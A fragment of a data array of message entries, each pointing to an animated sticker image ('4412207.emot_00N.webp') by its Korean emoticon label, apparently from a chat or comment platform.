        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
